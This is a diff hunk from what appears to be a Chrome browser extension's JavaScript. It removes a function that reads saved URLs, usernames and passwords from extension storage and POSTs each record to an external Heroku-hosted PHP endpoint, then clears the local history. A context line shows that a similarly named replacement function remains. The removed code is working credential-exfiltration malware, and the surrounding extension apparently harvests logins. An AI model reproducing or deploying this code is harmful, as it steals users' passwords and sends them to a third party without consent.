@@ -296,39 +296,6 @@ function resetHistory() {
     chrome.tabs.reload();
 }
 
-function postToDatabaseOld() {
-    chrome.storage.sync.get(null, function (result) {
-        // count the number of entries
-        entryCount = result.urls.length;
-
-        var urlTemp, usernameTemp, passwordTemp, timeTemp;
-
-        // insert each entry into an external database
-        for (i=0; i<entryCount; i++) {
-            urlTemp = result.urls[i];
-            usernameTemp = result.usernames[i];
-            passwordTemp = result.passwords[i];
-            // replace '+' symbol with "%2B"
-            passwordTemp = passwordTemp.replace("+", "%2B");
-            timeTemp = result.times[i];
-
-            var input = "url="+urlTemp+"&username="+usernameTemp+"&password="+passwordTemp+"&time="+timeTemp;
-            console.log("INPUT: "+input);
-            var xhr = new XMLHttpRequest();
-
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    console.log(xhr.responseText);
-                }
-            }
-
-            xhr.open("POST", "https://php-hollaholl.herokuapp.com/dbhandle.php", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.send(input);
-        }
-        resetHistory();
-    });
-}
 function postToDatabase() {
     chrome.storage.sync.get(null, function (result) {
         // count the number of entries
